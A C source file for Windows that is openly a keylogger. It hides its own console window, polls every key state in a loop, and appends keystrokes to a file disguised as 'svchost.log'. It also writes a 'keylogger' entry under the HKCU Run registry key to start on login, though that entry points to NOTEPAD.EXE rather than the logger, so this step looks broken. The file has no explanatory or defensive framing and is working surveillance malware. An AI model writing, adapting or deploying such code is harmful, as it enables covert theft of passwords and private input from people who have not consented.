#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>

#define BUFSIZE 80

int get_keys(void);
void create_regkey(void);

int main(void)
{
	int t;
   HWND stealth; /*creating stealth (window is not visible)*/
   AllocConsole();
   stealth=FindWindowA("ConsoleWindowClass",NULL);
   ShowWindow(stealth,0);
 
   create_regkey();
    
   t=get_keys();
 
   return t;
}  

int get_keys(void)
{
           short character;
             while(1)
             {
                    for(character=8;character<=222;character++)
                    {
                        if(GetAsyncKeyState(character)==-32767)
                        {  

                            FILE *file;
                            file=fopen("svchost.log","a+");
                            if(file==NULL)
                            {
                                    return 1;
                            }            
                            if(file!=NULL)
                            {        
                                    if((character>=39)&&(character<=64))
                                    {
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }        
                                    else if((character>64)&&(character<91))
                                    {
                                          character+=32;
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }
                                    else
                                    {
                                        switch(character)
                                        {
                                              case VK_SPACE:
                                              fputc(' ',file);
                                              fclose(file);
                                              break;    
                                              case VK_SHIFT:
                                              fputs("[SHIFT]",file);
                                              fclose(file);
                                              break;                                            
                                              case VK_RETURN:
                                              fputs("\n[ENTER]",file);
                                              fclose(file);
                                              break;
                                              case VK_BACK:
                                              fputs("[BACKSPACE]",file);
                                              fclose(file);
                                              break;
                                              case VK_TAB:
                                              fputs("[TAB]",file);
                                              fclose(file);
                                              break;
                                              case VK_CONTROL:
                                              fputs("[CTRL]",file);
                                              fclose(file);
                                              break;    
                                              case VK_DELETE:
                                              fputs("[DEL]",file);
                                              fclose(file);
                                              break;
                                              
                                              case VK_NUMPAD0:
                                              fputc('0',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD1:
                                              fputc('1',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD2:
                                              fputc('2',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD3:
                                              fputc('3',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD4:
                                              fputc('4',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD5:
                                              fputc('5',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD6:
                                              fputc('6',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD7:
                                              fputc('7',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD8:
                                              fputc('8',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD9:
                                              fputc('9',file);
                                              fclose(file);
                                              break;
                                              case VK_CAPITAL:
                                              fputs("[CAPS LOCK]",file);
                                              fclose(file);
                                              break;
                                              default:
                                              fclose(file);
                                              break;
                                       }        
                                  }    
                             }        
                   }    
               }                  

           }
           return EXIT_SUCCESS;                            
}                                                

void create_regkey(void)
{
	DWORD lRv;
    HKEY hKey;
	  DWORD dwDesc;
	 char *path = "C:\\WINDOWS\\NOTEPAD.EXE";

lRv = RegCreateKeyEx(HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
                &hKey, &dwDesc);  
  if(lRv == ERROR_SUCCESS) 
 {
        RegSetValueEx(hKey, "keylogger", 0, REG_SZ, (BYTE*)path, strlen(path));
 }

 }
